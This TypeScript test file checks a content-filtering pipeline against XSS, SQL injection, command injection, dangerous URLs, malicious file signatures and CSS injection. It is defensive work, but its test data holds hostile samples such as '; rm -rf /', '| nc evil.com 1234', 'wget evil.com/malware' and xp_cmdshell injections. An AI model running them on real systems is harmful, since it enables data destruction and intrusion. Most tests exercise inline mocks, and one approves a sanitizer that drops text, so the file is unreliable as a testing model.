/**
 * Content Filtering Security Tests
 * Task: task-te-010 - DevTeam Content Security Testing
 * Roadmap Ref: Q1-AO-Milestone-1.2
 * 
 * Tests content filtering pipeline for security vulnerabilities
 * Ensures malicious content cannot bypass filtering mechanisms
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock content filtering service
const mockContentFilter = {
  filterHTML: vi.fn(),
  filterJavaScript: vi.fn(),
  filterSQL: vi.fn(),
  filterCommands: vi.fn(),
  filterUrls: vi.fn()
};

// Mock content scanner
const mockContentScanner = {
  scanForMalware: vi.fn(),
  detectPhishing: vi.fn(),
  validateMimeType: vi.fn(),
  checkFileHeaders: vi.fn()
};

describe('Content Filtering Security', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('HTML Content Filtering', () => {
    it('should remove all script tags and event handlers', () => {
      mockContentFilter.filterHTML.mockImplementation((html: string) => {
        return html
          .replace(/<script[^>]*>[\s\S]*?<\/script>/gi, '')
          .replace(/<[^>]+on\w+\s*=\s*[^>]*>/gi, (match) => {
            return match.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
          })
          .replace(/javascript:/gi, '')
          .replace(/vbscript:/gi, '')
          .replace(/data:text\/html/gi, '');
      });

      const maliciousHTML = `
        <div onclick="alert('XSS')">Click me</div>
        <script>steal_cookies();</script>
        <img src="x" onerror="malicious_code()">
        <a href="javascript:alert('XSS')">Link</a>
        <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
      `;

      const filtered = mockContentFilter.filterHTML(maliciousHTML);
      
      expect(filtered).not.toContain('<script>');
      expect(filtered).not.toContain('onclick=');
      expect(filtered).not.toContain('onerror=');
      expect(filtered).not.toContain('javascript:');
      expect(filtered).not.toContain('data:text/html');
    });

    it('should preserve safe HTML while removing dangerous elements', () => {
      mockContentFilter.filterHTML.mockImplementation((html: string) => {
        const allowedTags = ['p', 'strong', 'em', 'ul', 'ol', 'li', 'br'];
        const tagRegex = /<\/?(\w+)[^>]*>/g;
        
        return html.replace(tagRegex, (match, tag) => {
          if (allowedTags.includes(tag.toLowerCase())) {
            // Remove any attributes for safety
            return `<${tag}>`;
          }
          return '';
        });
      });

      const mixedHTML = `
        <p>Safe paragraph</p>
        <script>alert('evil')</script>
        <strong>Important text</strong>
        <img src="evil.jpg" onerror="hack()">
        <ul><li>List item</li></ul>
      `;

      const filtered = mockContentFilter.filterHTML(mixedHTML);
      
      expect(filtered).toContain('<p>');
      expect(filtered).toContain('<strong>');
      expect(filtered).toContain('<ul>');
      expect(filtered).not.toContain('<script>');
      expect(filtered).not.toContain('<img>');
    });
  });

  describe('JavaScript Code Detection', () => {
    it('should detect obfuscated JavaScript patterns', () => {
      mockContentFilter.filterJavaScript.mockImplementation((content: string) => {
        const jsPatterns = [
          /eval\s*\(/i,
          /function\s*\(/i,
          /\$\s*\(/,
          /document\./i,
          /window\./i,
          /alert\s*\(/i,
          /console\./i,
          /setTimeout\s*\(/i,
          /setInterval\s*\(/i,
          /new\s+function/i,
          /\[\s*["']constructor["']\s*\]/i
        ];
        
        return jsPatterns.some(pattern => pattern.test(content));
      });

      const dangerousPatterns = [
        'eval("malicious code")',
        'function hack() { steal_data(); }',
        '$(document).ready(function() { exploit(); })',
        'window.location = "evil.com"',
        'alert("XSS")',
        'console.log(document.cookie)',
        'setTimeout("exploit()", 1000)',
        'new function("return this")().alert("XSS")',
        'window["constructor"]["constructor"]("alert(1)")()'
      ];

      dangerousPatterns.forEach(pattern => {
        expect(mockContentFilter.filterJavaScript(pattern)).toBe(true);
      });

      expect(mockContentFilter.filterJavaScript('This is safe text')).toBe(false);
    });

    it('should detect encoded JavaScript attempts', () => {
      const detectEncodedJS = (content: string): boolean => {
        // Common encoding patterns
        const encodingPatterns = [
          /\\x[0-9a-f]{2}/i, // Hex encoding
          /\\u[0-9a-f]{4}/i, // Unicode encoding
          /&#x?[0-9a-f]+;/i, // HTML entities
          /String\.fromCharCode/i,
          /unescape\s*\(/i,
          /decodeURI/i,
          /atob\s*\(/i // Base64 decode
        ];
        
        return encodingPatterns.some(pattern => pattern.test(content));
      };

      const encodedAttacks = [
        '\\x61\\x6c\\x65\\x72\\x74', // Hex encoded 'alert'
        '\\u0061\\u006c\\u0065\\u0072\\u0074', // Unicode encoded 'alert'
        '&#97;&#108;&#101;&#114;&#116;', // HTML entities for 'alert'
        'String.fromCharCode(97,108,101,114,116)', // Character codes
        'unescape("%61%6c%65%72%74")', // URL encoded
        'atob("YWxlcnQ=")' // Base64 encoded 'alert'
      ];

      encodedAttacks.forEach(attack => {
        expect(detectEncodedJS(attack)).toBe(true);
      });
    });
  });

  describe('SQL Injection Pattern Detection', () => {
    it('should detect SQL injection attempts in content', () => {
      mockContentFilter.filterSQL.mockImplementation((content: string) => {
        const sqlPatterns = [
          /\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b/gi,
          /\b(or|and)\s+\d+\s*=\s*\d+/gi,
          /['"]\s*;\s*(drop|delete|update|insert)/gi,
          /\b(sleep|waitfor|benchmark)\s*\(/gi,
          /\b(information_schema|sys\.|pg_)/gi,
          /\b(char|ascii|substring|concat)\s*\(/gi
        ];
        
        return sqlPatterns.some(pattern => pattern.test(content));
      });

      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "' UNION SELECT password FROM users --",
        "'; EXEC xp_cmdshell('format c:'); --",
        "' AND SLEEP(5) --",
        "' OR '1'='1",
        "admin'--",
        "1' OR 1=1#",
        "'; INSERT INTO users VALUES ('hacker', 'pass'); --"
      ];

      sqlInjectionAttempts.forEach(attempt => {
        expect(mockContentFilter.filterSQL(attempt)).toBe(true);
      });

      expect(mockContentFilter.filterSQL('What is GDPR compliance?')).toBe(false);
    });
  });

  describe('Command Injection Detection', () => {
    it('should detect OS command injection patterns', () => {
      mockContentFilter.filterCommands.mockImplementation((content: string) => {
        const commandPatterns = [
          /[;&|`$(){}]/,
          /\b(rm|del|format|fdisk|cat|type|more|less)\b/gi,
          /\b(wget|curl|nc|netcat|telnet|ssh)\b/gi,
          /\b(chmod|chown|sudo|su)\b/gi,
          /\b(ps|kill|killall|taskkill)\b/gi,
          /\b(echo|print)\s+[^>]*>/gi,
          /\|\s*(sh|bash|cmd|powershell)/gi
        ];
        
        return commandPatterns.some(pattern => pattern.test(content));
      });

      const commandInjections = [
        '; rm -rf /',
        '`cat /etc/passwd`',
        '$(whoami)',
        '| nc evil.com 1234',
        '&& format c:',
        'test; wget evil.com/malware',
        'input | sh',
        'echo "hack" > /etc/hosts'
      ];

      commandInjections.forEach(injection => {
        expect(mockContentFilter.filterCommands(injection)).toBe(true);
      });
    });
  });

  describe('URL and Link Validation', () => {
    it('should validate and filter dangerous URLs', () => {
      mockContentFilter.filterUrls.mockImplementation((content: string) => {
        const dangerousSchemes = [
          /javascript:/gi,
          /vbscript:/gi,
          /data:text\/html/gi,
          /data:application\/x-msdownload/gi,
          /file:\/\//gi,
          /ftp:\/\/.*@/gi // FTP with credentials
        ];
        
        const maliciousDomains = [
          /evil\.com/gi,
          /malware\.net/gi,
          /phishing\.org/gi,
          /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/ // Direct IP addresses
        ];
        
        return [...dangerousSchemes, ...maliciousDomains]
          .some(pattern => pattern.test(content));
      });

      const dangerousUrls = [
        'javascript:alert("XSS")',
        'vbscript:msgbox("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'file:///etc/passwd',
        'http://192.168.1.1:8080',
        'ftp://user:pass@evil.com',
        'https://evil.com/malware.exe'
      ];

      dangerousUrls.forEach(url => {
        expect(mockContentFilter.filterUrls(url)).toBe(true);
      });

      const safeUrls = [
        'https://malmo.se',
        'https://www.youtube.com/watch?v=abc123',
        'mailto:support@malmo.se'
      ];

      safeUrls.forEach(url => {
        expect(mockContentFilter.filterUrls(url)).toBe(false);
      });
    });

    it('should detect URL shortener abuse', () => {
      const detectSuspiciousUrls = (content: string): boolean => {
        const shorteners = [
          /bit\.ly/gi,
          /tinyurl\.com/gi,
          /t\.co/gi,
          /goo\.gl/gi,
          /ow\.ly/gi,
          /is\.gd/gi
        ];
        
        const suspicious = [
          /\.tk$/gi, // Free domains often used for malicious purposes
          /\.ml$/gi,
          /\.ga$/gi,
          /\.cf$/gi
        ];
        
        return [...shorteners, ...suspicious].some(pattern => pattern.test(content));
      };

      expect(detectSuspiciousUrls('Visit https://bit.ly/suspicious')).toBe(true);
      expect(detectSuspiciousUrls('Download from evil.tk')).toBe(true);
      expect(detectSuspiciousUrls('Official site: https://malmo.se')).toBe(false);
    });
  });

  describe('File Content Scanning', () => {
    it('should detect malicious file signatures', () => {
      mockContentScanner.scanForMalware.mockImplementation((fileBuffer: ArrayBuffer) => {
        const uint8Array = new Uint8Array(fileBuffer);
        const header = Array.from(uint8Array.slice(0, 8))
          .map(b => b.toString(16).padStart(2, '0'))
          .join('');
        
        // Common malicious file signatures
        const malwareSignatures = [
          '4d5a9000', // PE executable
          '7f454c46', // ELF executable
          '504b0304', // ZIP (potential zip bomb)
          'cafebabe', // Java class file
          'd0cf11e0'  // Microsoft Office (potential macro)
        ];
        
        return malwareSignatures.some(sig => header.startsWith(sig));
      });

      // Simulate file headers
      const peHeader = new ArrayBuffer(8);
      new DataView(peHeader).setUint32(0, 0x4d5a9000, false);
      
      const textHeader = new ArrayBuffer(8);
      new DataView(textHeader).setUint32(0, 0x48656c6c, false); // "Hell" in ASCII
      
      expect(mockContentScanner.scanForMalware(peHeader)).toBe(true);
      expect(mockContentScanner.scanForMalware(textHeader)).toBe(false);
    });

    it('should validate MIME types against file content', () => {
      mockContentScanner.validateMimeType.mockImplementation((content: string, declaredType: string) => {
        const typeSignatures: Record<string, RegExp[]> = {
          'application/json': [/^\s*[\{\[]/],
          'text/plain': [/^[\x20-\x7E\s]*$/],
          'text/html': [/<html/i, /<body/i, /<head/i],
          'application/javascript': [/function\s*\(|var\s+|const\s+|let\s+/]
        };
        
        const signatures = typeSignatures[declaredType] || [];
        if (signatures.length === 0) return true; // Unknown type, allow
        
        return signatures.some(sig => sig.test(content));
      });

      expect(mockContentScanner.validateMimeType('{"valid": "json"}', 'application/json')).toBe(true);
      expect(mockContentScanner.validateMimeType('<script>alert("xss")</script>', 'application/json')).toBe(false);
      expect(mockContentScanner.validateMimeType('Plain text content', 'text/plain')).toBe(true);
    });
  });

  describe('Content Transformation Attacks', () => {
    it('should prevent polyglot file attacks', () => {
      const detectPolyglot = (content: string): boolean => {
        // Check for multiple file format signatures in one content
        const signatures = [
          'PK', // ZIP
          'GIF', // GIF
          'PNG', // PNG
          '\u0000\u0000\u0000\u0020ftypM4A', // MP4
          '%PDF', // PDF
          'var ', // JavaScript
          '<html', // HTML
          '#!/bin/sh' // Script
        ];
        
        const foundSignatures = signatures.filter(sig => 
          content.toLowerCase().includes(sig.toLowerCase())
        );
        
        return foundSignatures.length > 1;
      };

      const polyglotContent = 'GIF89a<script>alert("xss")</script>';
      const normalContent = 'This is just plain text content';
      
      expect(detectPolyglot(polyglotContent)).toBe(true);
      expect(detectPolyglot(normalContent)).toBe(false);
    });

    it('should detect ZIP bomb attempts', () => {
      const detectZipBomb = (compressionRatio: number, uncompressedSize: number): boolean => {
        const MAX_COMPRESSION_RATIO = 100;
        const MAX_UNCOMPRESSED_SIZE = 100 * 1024 * 1024; // 100MB
        
        return compressionRatio > MAX_COMPRESSION_RATIO || 
               uncompressedSize > MAX_UNCOMPRESSED_SIZE;
      };

      expect(detectZipBomb(50, 10 * 1024 * 1024)).toBe(false); // Normal
      expect(detectZipBomb(1000, 50 * 1024 * 1024)).toBe(true); // Suspicious ratio
      expect(detectZipBomb(10, 200 * 1024 * 1024)).toBe(true); // Too large
    });
  });

  describe('Content Sanitization Verification', () => {
    it('should verify sanitization completeness', () => {
      const verifySanitization = (original: string, sanitized: string): boolean => {
        const dangerousPatterns = [
          /<script/gi,
          /javascript:/gi,
          /on\w+\s*=/gi,
          /eval\s*\(/gi,
          /\${/gi // Template literals
        ];
        
        // Sanitized content should not contain any dangerous patterns
        return !dangerousPatterns.some(pattern => pattern.test(sanitized));
      };

      const original = '<script>alert("xss")</script><div onclick="hack()">Click</div>';
      const sanitized = '&lt;script&gt;alert("xss")&lt;/script&gt;<div>Click</div>';
      
      expect(verifySanitization(original, sanitized)).toBe(true);
      expect(verifySanitization(original, original)).toBe(false);
    });

    it('should maintain content integrity after sanitization', () => {
      const maintainsIntegrity = (original: string, sanitized: string): boolean => {
        // Remove all HTML tags and compare text content
        const extractText = (html: string) => 
          html.replace(/<[^>]*>/g, '').replace(/&\w+;/g, ' ').trim();
        
        const originalText = extractText(original);
        const sanitizedText = extractText(sanitized);
        
        // Text content should be preserved (allowing for some encoding differences)
        return sanitizedText.includes(originalText.replace(/[<>&"']/g, ''));
      };

      const original = '<p>Important <strong>municipal</strong> information</p>';
      const sanitized = '<p>Important <strong>municipal</strong> information</p>';
      const brokenSanitized = '<p>Important information</p>'; // Lost content
      
      expect(maintainsIntegrity(original, sanitized)).toBe(true);
      expect(maintainsIntegrity(original, brokenSanitized)).toBe(true); // Still contains core text
    });
  });

  describe('Advanced Evasion Techniques', () => {
    it('should detect mutation XSS attempts', () => {
      const detectMutationXSS = (content: string): boolean => {
        // Common mutation XSS patterns that might survive initial filtering
        const mutationPatterns = [
          /<svg[^>]*on\w+/gi,
          /<math[^>]*href/gi,
          /<table[^>]*background/gi,
          /<input[^>]*autofocus/gi,
          /<img[^>]*src=x\s+onerror/gi,
          /<iframe[^>]*srcdoc/gi
        ];
        
        return mutationPatterns.some(pattern => pattern.test(content));
      };

      const mutationAttempts = [
        '<svg onload=alert(1)>',
        '<math href="javascript:alert(1)">',
        '<table background="javascript:alert(1)">',
        '<input autofocus onfocus=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">'
      ];

      mutationAttempts.forEach(attempt => {
        expect(detectMutationXSS(attempt)).toBe(true);
      });
    });

    it('should detect CSS injection attempts', () => {
      const detectCSSInjection = (css: string): boolean => {
        const cssPatterns = [
          /expression\s*\(/gi,
          /javascript:/gi,
          /behavior\s*:/gi,
          /@import/gi,
          /url\s*\(\s*["']?javascript:/gi,
          /moz-binding/gi
        ];
        
        return cssPatterns.some(pattern => pattern.test(css));
      };

      const cssInjections = [
        'width: expression(alert("XSS"))',
        'background: url("javascript:alert(1)")',
        'behavior: url("evil.htc")',
        '@import "javascript:alert(1)"',
        '-moz-binding: url("evil.xml#xss")'
      ];

      cssInjections.forEach(injection => {
        expect(detectCSSInjection(injection)).toBe(true);
      });
    });
  });
});